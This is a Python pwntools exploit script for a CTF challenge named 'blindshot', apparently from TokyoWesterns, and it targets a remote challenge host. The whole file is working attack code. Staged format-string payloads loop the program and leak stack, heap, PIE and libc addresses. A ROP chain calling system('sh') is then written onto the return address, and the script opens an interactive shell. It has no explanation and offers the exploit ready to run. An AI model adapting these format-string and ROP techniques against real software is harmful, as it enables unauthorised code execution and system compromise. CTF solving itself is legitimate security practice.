#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("blindshot")
libc = ELF("libc-2.31.so") if args.REMOTE else exe.libc

if not args.REMOTE:
    #context.aslr = False
    pass


r = None
def connect(fresh=True, local=False):
    global r
    if r is not None:
        if fresh:
            r.close()
        else:
            return
    r = remote("pwn01.chal.ctf.westerns.tokyo", 12463) if args.REMOTE and not local else exe.process()

# make loop
STAGE0 = "".join([
    f"%0c%0c%0c%0c%*c",      # next: 7
    f"%{0xfedc - 9}c",       # next: 8
    f"%0c" * 3,              # next: 11
    f"%hhn",                 # next: 12
    f"%0c" * 6,              # next: 18
    f"%hn",
    f"%1$*15$c" * 15,
    f"%{15 * 6 + 0x0e}c",
    f"%46$hhn",
])

# enable output by returning to main with eax=0x101 (fd will be al = 0x1 for next call)
STAGE1 = "".join([
    f"%{0x7e}c%46$hhn",
    f"%{0x101-0x7e}c",
])

# leak all the things
STAGE2 = "".join([
    # set ret to loop
    f"%{0x8e}c%46$hhn",

    "LEAKS:",

    # leak stack
    "%5$p,",

    # leak heap
    "%9$p,",

    # leak pie base
    "%12$p,",

    # leak libc
    "%16$p,",
])

for _ in range(20):
    connect()
    try:
        r.sendlineafter("> ", STAGE0)
        r.recvline_contains("done")
        r.recvuntil("> ")
        break
    except EOFError:
        pass

r.sendline(STAGE1)
r.recvline_contains("done")

# do the leaks
r.sendlineafter("> ", STAGE2)
r.recvuntil("LEAKS:")
stack_ptr, heap_ptr, pie_ptr, libc_ptr = [int(x.decode(), 16) for x in r.recvline().split(b",")[:-1]]
info(f"{stack_ptr = :#x} {heap_ptr = :#x} {pie_ptr = :#x} {libc_ptr = :#x}")

rbp = stack_ptr - 0x128
libc.address = libc_ptr - libc.symbols.__libc_start_main - 243
info(f"libc base: {libc.address:#x}")

rop = ROP(libc)
rop.call('system', (next(libc.search(b"sh\0")), ))
chain = rop.chain()

# align stack
count = len(chain) // 8
RET = rop.search(move=0).address
chain = p64(RET) * 3 + chain

def make_write(addr, byte):
    assert addr & ~0xffff == stack_ptr & ~0xffff
    return "".join([
        # set ret to loop
        f"%{0x8e}c%46$hhn",

        # set the write pointer
        f"%{(addr & 0xffff) - 0x8e}c%5$hn",

        # return
        "\n",

        # set ret to loop
        f"%{0x8e}c%46$hhn",

        # write byte
        f"%{(byte - 0x8e) % 0x100}c%48$hhn" + "\n",
    ])

main_ret = rbp + 0x28

# for i in range(0, len(chain), 8):
#     chunk = chain[i:i+8]
#     assert len(payload) < 200
#     r.sendlineafter("> ", payload)
# print(len(payload))
r.send("".join(make_write(main_ret + i, v) for i, v in enumerate(chain)))

r.interactive()
